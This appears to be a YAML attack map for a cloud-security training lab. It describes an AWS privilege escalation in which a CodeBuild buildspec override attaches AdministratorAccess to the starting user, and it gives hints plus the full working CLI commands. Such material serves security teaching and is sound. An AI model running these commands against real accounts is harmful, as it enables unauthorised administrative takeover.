attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-codebuild-003-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has codebuild:StartBuildBatch permission (along with
        codebuild:ListProjects, codebuild:BatchGetProjects, and
        codebuild:BatchGetBuildBatches) and can trigger builds against an existing
        CodeBuild project that has a privileged service role attached.

    - id: codebuild-project
      label: "Target CodeBuild Project"
      type: resource
      subType: codebuild-project
      arn: "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-003-to-admin-target-project"
      description: >
        An existing CodeBuild project configured to support batch builds. It has the
        target service role attached, which grants it iam:AttachUserPolicy. Because
        StartBuildBatch accepts a buildspec override, any principal with
        codebuild:StartBuildBatch can inject arbitrary commands that execute under
        this project's privileged role — no iam:PassRole or codebuild:CreateProject
        required.

    - id: target-role
      label: "Target Service Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-codebuild-003-to-admin-target-role"
      description: >
        The CodeBuild service role attached to the target project. It has
        iam:AttachUserPolicy permission, allowing it to attach any managed policy —
        including AdministratorAccess — to any IAM user. Commands injected via
        buildspec override execute under the context of this role. Gaining the
        ability to act as this role completes the privilege escalation — the
        injected buildspec attaches AdministratorAccess to the starting user,
        granting full administrative control over the AWS account.

  edges:
    - from: starting-principal
      to: codebuild-project
      label: "codebuild:StartBuildBatch"
      description: >
        Trigger a batch build on the existing project using --buildspec-override
        to inject a malicious buildspec that will execute under the project's
        privileged service role.
      hints:
        - "You can start builds on existing CodeBuild projects. Look at what permissions those projects' service roles have."
        - "CodeBuild allows you to override the buildspec at invocation time. Think about what you could execute using the project's service role."
        - "Use --buildspec-override to inject commands that modify IAM on behalf of the privileged service role."
        - "Browse to https://pathfinding.cloud/paths/codebuild-003 for technique details."
      commands:
        - description: "List available CodeBuild projects"
          command: "aws codebuild list-projects"
        - description: "Inspect the project's service role"
          command: "aws codebuild batch-get-projects --names pl-prod-codebuild-003-to-admin-target-project"
        - description: "Start a batch build with a malicious buildspec override that attaches AdministratorAccess to the starting user"
          command: |
            aws codebuild start-build-batch \
              --project-name pl-prod-codebuild-003-to-admin-target-project \
              --buildspec-override 'version: 0.2
            batch:
              fast-fail: false
              build-list:
                - identifier: escalate
                  env:
                    type: LINUX_CONTAINER
                    image: aws/codebuild/standard:7.0
                    compute-type: BUILD_GENERAL1_SMALL
            phases:
              build:
                commands:
                  - aws iam attach-user-policy --user-name pl-prod-codebuild-003-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess'
        - description: "Monitor the batch build until it completes"
          command: "aws codebuild batch-get-build-batches --ids <batch-build-id>"

    - from: codebuild-project
      to: target-role
      label: "iam:AttachUserPolicy (via buildspec)"
      description: >
        CodeBuild assumes the attached service role when executing the build,
        granting the injected buildspec commands the permissions of that role.
        The malicious buildspec runs as the service role and attaches the
        AdministratorAccess managed policy to the starting user, completing the
        privilege escalation.
      commands:
        - description: "Verify admin access after the build completes"
          command: "aws iam list-users --max-items 1"
